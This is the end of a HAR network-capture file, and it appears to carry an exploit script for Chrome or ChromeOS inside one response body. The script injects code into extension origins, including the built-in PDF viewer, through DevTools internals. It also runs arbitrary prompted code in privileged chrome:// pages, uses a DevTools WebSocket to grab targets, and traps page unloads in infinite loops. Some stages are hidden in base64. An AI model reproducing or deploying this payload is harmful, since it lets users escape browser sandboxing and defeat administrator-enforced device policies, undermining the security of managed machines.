GVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvcHJhaGl0LnBuZyI7CiAgICAgICAgICAgIHNub3dmbGFrZS5hcHBlbmRDaGlsZChzbm93Zmxha2VJbWFnZSk7CgogICAgICAgICAgICBzbm93Zmxha2VzRGl2LmFwcGVuZENoaWxkKHNub3dmbGFrZSk7CiAgICAgICAgfQoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNub3dmbGFrZXNEaXYpOwoKICAgICAgICBjb25zdCBleHBsb3Npb25JbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnNyYyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvYm9vbS5hd2VicCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLnRvcCA9ICIwIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5sZWZ0ID0gIjAiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGV4cGxvc2lvbkltYWdlKTsKCiAgICAgICAgY29uc3QgZXhwbG9kZSA9IG5ldyBBdWRpbygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2Jvb20ubXAzIik7CgogICAgICAgIGNvbnN0IGNhdHNNdXNpYyA9IG5ldyBBdWRpbygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2NhdHMubXAzIik7CiAgICAgICAgY2F0c011c2ljLmxvb3AgPSB0cnVlOwoKICAgICAgICBmdW5jdGlvbiBzaG93RXhwbG9zaW9uQW5kUGxheU11c2ljKCkgewoKICAgICAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7CgogICAgICAgICAgICBleHBsb2RlLnBsYXkoKTsKICAgICAgICAgICAgY2F0c011c2ljLnBsYXkoKTsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICB9LCAxNTAwKTsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBleHBsb2RlLnBhdXNlKCk7CiAgICAgICAgICAgICAgICBleHBsb2RlLmN1cnJlbnRUaW1lID0gMDsKICAgICAgICAgICAgfSwgMTUwMCk7CiAgICAgICAgfQoKICAgICAgICBzaG93RXhwbG9zaW9uQW5kUGxheU11c2ljKCk7CgogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBpZiAob25UYWIpIHsKICAgICAgICBjb2RlID0gY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCA/CiAgICAgICAgICAgIGA7Y2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCgKICAgICAgICAgICR7dGFiSWR9LAogICAgICAgICAgeyBjb2RlOiAke0pTT04uc3RyaW5naWZ5KGNvZGUpfSB9CiAgICAgICAgKWAgOgogICAgICAgICAgICBjaHJvbWUuc2NyaXB0aW5nID8KICAgICAgICAgICAgYGNocm9tZS5zY3JpcHRpbmcuZXhlY3V0ZVNjcmlwdCh7CiAgICAgICAgICB0YXJnZXQ6IHt0YWJJZDogJHt0YWJJZH19LAogICAgICAgICAgZnVuYzogKCkgPT4geyR7Y29kZX19CiAgICAgICAgfSk7YCA6CiAgICAgICAgICAgIGBhbGVydCgic29tZXRoaW5nIHdlbnQgd3JvbmcsIHJ1bkNvZGUgd2FzIGV4ZWN1dGVkIG9uIGEgdGFiIHdpdGhvdXQgcHJvcGVyIHBlcm1pc3Npb25zIilgOwogICAgfQoKICAgIHRyeSB7CiAgICAgICAgY29uc3Qgb3JpZ2luYWxMb2cgPSBjb25zb2xlLmxvZzsKICAgICAgICBjb25zb2xlLmxvZyA9ICguLi5hcmdzKSA9PiB7CiAgICAgICAgICAgIG91dHB1dERpdi5pbm5lckhUTUwgKz0gYXJncy5qb2luKCIgIikgKyAiPGJyPiI7CiAgICAgICAgfTsKCiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CgogICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoInNyYy5qcyIsIGNvZGUpOwogICAgICAgIGxldCBzY3JpcHQgPQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNldmFsdWF0ZV9lbGVtIikgPz8KICAgICAgICAgICAgZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LnJlbW92ZSgpOwogICAgICAgIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5pZCA9ICJldmFsdWF0ZV9lbGVtIjsKICAgICAgICBzY3JpcHQuc3JjID0gdXJsOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKCiAgICAgICAgY29uc29sZS5sb2cgPSBvcmlnaW5hbExvZzsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgb3V0cHV0RGl2LmlubmVySFRNTCA9IGBFcnJvcjogJHtlcnJvcn1gOwogICAgfQp9Owo=`))\n                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4K')}<script src=\"./index.js\" ></script>`);\n                    w.chrome.tabs.create({ url });\n                    w.close();\n                    cleanup();\n                });\n\n\n                // }, 5000);\n            \n            }\n            document.open();\n            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html\n            document.write(atob(``));\n            document.querySelector('#activate').onclick = function () {\n                dbgext(false, pdfId);\n            }\n            onunload = function () {\n                while (true);\n            }\n            document.close();\n            document.title = \"Dashboard\";\n            document.querySelector('#activate2').onclick = function (ev) {\n\n                function xd(w) {\n                    w.close();\n                    const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                    const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                    chrome.tabs.getCurrent(function (tab) {\n                        console.log(tab);\n                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {\n                            async function createAndWriteFile() {\n                                function writeFile(filename, content) {\n                                    return new Promise((resolve) => {\n                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {\n                                            fs.root.getFile(filename, { create: true }, function (entry) {\n                                                entry.remove(function () {\n                                                    fs.root.getFile(filename, { create: true }, function (entry) {\n                                                        entry.createWriter(function (writer) {\n                                                            writer.write(new Blob([content]))\n                                                            writer.onwriteend = function () {\n                                                                resolve(entry.toURL());\n                                                            }\n                                                        })\n                                                    })\n                                                })\n                                            })\n                                        })\n                                    })\n\n                                }\n                                const htmlFile = `<html>\n                                <head></head><body><iframe src=\"filesystem:chrome://extensions/temporary/nothing.html\"></iframe>\n                                </html>\n                                <script>\n                                onerror=  alert;\n                                if (top !== window) {\n                                    top.location.replace(location.href);\n                                };\n                                </script>\n                                `\n                                \n                                // alert(url);\n                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');\n                                setTimeout(function () {\n                                    close();\n                                }, 800);\n                            }\n                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });\n                            function m2(url) {\n                                // alert(url);\n                                onmessage = function (data) {\n                                    if (data.data.type === \"ack\") {\n                                        \n                                        // chrome.tabs.getCurrent(function (tab) {\n                                            // alert(\"navigating\");\n                                            top.location.replace(\"\")\n                                        // })\n                                    }\n                                }\n                                top.postMessage({ type: 'acc' }, '*');\n                            }\n                            onmessage = function (dat) {\n                                if (dat.data.url) {\n                                    m2(dat.data.url);\n                                }\n                            };\n                        })\n                    })\n\n                }\n                dbgext(false, pdfId, xd.toString());\n            }\n            onmessage = function (ev) {\n                if (ev.data.type === \"browserInitNavigate\") {\n                    alert(1);\n                    ev.source.location.replace(ev.data.url);\n                }\n            }\n            document.querySelector('#updater').onclick = function (ev) {\n                onunload = null;\n                const ws = new WebSocket(\"ws://%%updaterurl%%\");\n\n                ws.onopen = function () {\n                    ws.onmessage = function (ev) {\n                        const received = JSON.parse(ev.data);\n                        const savedURL = received.params.request.url;\n                        ws.close();\n                        const w = open('', '_blank');\n                        console.log(savedURL);\n                        w.eval(`setTimeout(function () {opener.open(atob(\"${btoa(savedURL)}\"), '_blank'); window.close()}, 500);`);\n                        setTimeout(() => { location.reload() });\n                    }\n                    ws.send(JSON.stringify({\n                        method: \"Target.setDiscoverTargets\",\n                        id: 999,\n                        params: {}\n                    }));\n                }\n\n            }\n            onmessage = function (d) {\n                if (d.data.type === \"acc\") {\n                    onunload = function () { while (true); };\n                    d.source.postMessage({ type: \"ack\" }, '*');\n                    \n                };\n\n                if (!globalMap[d.data.uid]) return;\n\n                for (const frame of globalMap) {\n                    if (!frame) continue;\n                    if (frame.idx === d.data.uid) {\n                        frame.remove();\n                        delete globalMap[globalMap.indexOf(frame)];\n                        return;\n                    }\n                }\n            }\n            function dbgext(cleanup, id, payload) {\n                let x = id;\n                while (!x) {\n                    x = prompt('Extension id?');\n                    if (x === \"cancel\") {\n                        return;\n                    }\n                }\n                let path = '//manifest.json';\n                let is_pdf = false;\n                let injected = payload ?? payload_swamp.toString();\n                if (x === pdfId) {\n                    path = \"index.html\"; // pdf viewer hack\n                    is_pdf = true;\n                    const b = prompt(\"code to execute!\");\n                    if (!b) return;\n                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));\n                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');\n                    \n                }\n                const URL_1 = `chrome-extension://${x ??\n                    alert(\"NOTREACHED\")}/${path}`;\n                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: \"remove\", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);\n                const ifr = document.createElement(\"iframe\");\n                ifr.src = URL_1;\n                document.body.appendChild(ifr);\n                const ifrid = globalMap.push(ifr) - 1;\n                ifr.idx = ifrid;\n                ifr.onload = function () {\n\n                    ifr.contentWindow.postMessage({\n                        type: \"uidpass\", passcode:\n                            ifrid,\n                        cleanup: cleanup\n                    }, '*');\n                    // console.log('hi');\n                }\n                // alert(1);\n\n            }\n            document.querySelector('#troll').onclick = function () {\n                let removed = atob(\"Ly8gcmVtb3ZlZCBhdCB0aGUgcmVxdWVzdCBvZiB6ZWdsb2wKY29uc29sZS5sb2coMSk7CmFsZXJ0KCJUaGlzIHBheWxvYWQgaGFzIGJlZW4gcmVtb3ZlZCwgaXQgd2lsbCBub3QgYmUgZml4ZWQgb3IgdXBkYXRlZCBhZ2FpbiIpOw==\");\n                eval(removed);\n            }\n            document.querySelector('#extdbg').onclick = function () {\n                dbgext(false);\n            }\n            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {\n                let extid = el.getAttribute(\"ext\");\n                console.log(el.innerText, extid);\n                dbgext(false, extid);\n                }\n            });\n            document.querySelector('#cleanup').onclick = function () {\n                dbgext(true);\n            }\n            document.querySelector('#devdbg').onclick = function () {\n                var l_canceled = false;\n                const id = setTimeout(function m() {\n                    if (l_canceled) return;\n                    (new Function(prompt(\"Evaluate script! (type 'cancel' to cancel)\")))();\n                    if (!l_canceled) setTimeout(m, 0);\n                    clearTimeout(id);\n                });\n                Object.defineProperty(window, 'cancel', {\n                    get: function () {\n                        l_canceled = true;\n                    }, configurable: true\n                })\n                return;\n            }\n            console.log(globalMap);\n        }\n        w.eval(`(${ui.toString()})()`);\n        window.close();\n\n    }\n\n    function sleep(ms) {\n        return new Promise(resolve => {\n            setTimeout(resolve, ms);\n        });\n    }\n})\n)()\n"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1
        },
        "serverIPAddress": "0.0.0.0",
        "startedDateTime": "2025-05-09T00:29:25.416Z",
        "time": 100,
        "timings": {
          "blocked": 0,
          "dns": 0,
          "ssl": 0,
          "connect": 0,
          "send": 0,
          "wait": 50,
          "receive": 50,
          "_blocked_queueing": 0
        }
      }
    ]
  }
}
